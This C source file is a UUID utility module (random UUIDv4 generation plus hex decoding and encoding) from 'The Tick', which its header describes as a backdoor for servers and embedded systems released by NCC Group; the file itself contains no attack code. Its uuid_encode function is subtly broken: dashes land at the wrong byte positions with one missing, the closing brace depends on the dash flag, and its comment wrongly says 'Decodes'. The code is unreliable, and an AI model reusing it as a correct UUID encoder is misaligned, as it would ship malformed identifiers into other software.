/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "uuid4.h"

// Generates new random UUIDv4 values.
// Output buffer is assumed to be exactly 16 bytes long.
void uuid4(unsigned char *uuid)
{
    // Generate 16 random numbers using rand().
    // This is really bad but it works as a fallback.
    srand((unsigned int) time(NULL) ^ (unsigned int) getpid());
    int i;
    for (i = 0; i < 16; i++) {
        uuid[i] = (unsigned char) (unsigned int) rand();
    }

    // Do it again but this time using /dev/urandom.
    // Since we're overwriting the buffer we get a fallback.
    // Paranoid? Absolutely! ;)
#ifndef _WIN32
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        int total = 0;
        while (total < 16) {
            int bytes = read(fd, &uuid[total], 16 - total);
            if (bytes <= 0) break;  // should never happen...
            total = total + bytes;
        }
        close(fd);
    }
#endif

    // We need to make some bits fixed to follow the RFC.
    uuid[6] = 0x40 | (uuid[6] & 0xf);
    uuid[8] = 0x80 | (uuid[8] & 0x3f);
}

// Decodes a UUID from its human readable form into raw bytes.
// Output buffer is assumed to be exactly 16 bytes long.
// Returns 0 on success or -1 on error.
int uuid_decode(const char *str, unsigned char *uuid)
{
    // This is what an encoded UUID looks like:
    //
    // {123e4567-e89b-12d3-a456-426614174000}       (38 chars long)
    //
    // But we're also going to accept stuff like:
    //
    // 123e4567e89b12d3a456426614174000             (32 chars long)
    //
    // Because for simplicity we're just doing hex
    // decoding and ignoring curly brackets and dashes.

    // Internal buffer for the hex string characters.
    // This will not contain the actual chars but their numeric values.
    unsigned char values[32];

    // Copy only the hexadecimal digits and get their value.
    // We will strip curly brackets and dashes.
    // If we find any other type of character, however,
    // we will assume there's an error and return -1.
    int i = 0;
    while (i < 32) {
        unsigned char c = (unsigned char) *str++;
        if (c >= '0' && c <= '9') {
            c = c - '0';
        } else if (c >= 'a' && c <= 'f') {
            c = c - 'a' + 10;
        } else if (c >= 'A' && c <= 'F') {
            c = c - 'A' + 10;
        } else if (c == '{' || c == '}' || c == '-') {
            continue;
        } else {
            return -1;      // also detects null terminator
        }
        values[i] = c;
        i++;
    }
    if (i != 32) return -1;     // input too short

    // Now coalesce the values of all the individual digits.
    // Since we know the exact length we can just grab them in pairs.
    // Write directly into the output buffer.
    for (i = 0; i < 32; i += 2) {
        *uuid++ = (values[i] << 4) | values[i + 1];
    }

    // Return 0 to indicate success.
    return 0;
}

// Decodes a UUID from its human readable form into raw bytes.
// Input buffer is assumed to be exactly 16 bytes long.
// Use the output buffer size to specify the format.
// Returns 0 on success or -1 on error.
int uuid_encode(const unsigned char *uuid, char *str, size_t str_max)
{
    // Minimum output size is 32 chars, plus the null terminator.
    if (str_max < 33) return -1;

    // We will try to deduce if we must use dashes and/or curly brackets
    // based on the size of the output buffer.
    int use_brackets;
    int use_dashes;
    if (str_max == 33) {
        // 123e4567e89b12d3a456426614174000
        use_brackets = 0;
        use_dashes = 0;
    } else if (str_max == 35) {
        // {123e4567e89b12d3a456426614174000}
        use_brackets = 1;
        use_dashes = 0;
    } else if (str_max == 37) {
        // 123e4567-e89b-12d3-a456-426614174000
        use_brackets = 0;
        use_dashes = 1;
    } else if (str_max >= 39) {
        // {123e4567-e89b-12d3-a456-426614174000}
        use_brackets = 1;
        use_dashes = 1;
    } else {
        return -1;      // weird buffer size...
    }

    // Encode the UUID as a null terminated string.
    int i;
    for (i = 0; i < 16; i++) {
        if (use_brackets && i == 0) {
            *str++ = '{';
        }
        if (use_dashes && (i == 5 || i == 7 || i == 9)) {
            *str++ = '-';
        }
        unsigned char v1, v2;
        v1 = (uuid[i] & 0xF0) >> 4;
        v2 = (uuid[i] & 0x0F);
        *str++ = (v1 < 10) ? (v1 + '0') : (v1 + 'A' - 10);
        *str++ = (v2 < 10) ? (v2 + '0') : (v2 + 'A' - 10);
    }
    if (use_dashes) *str++ = '}';
    *str++ = 0;
    return 0;       // success
}
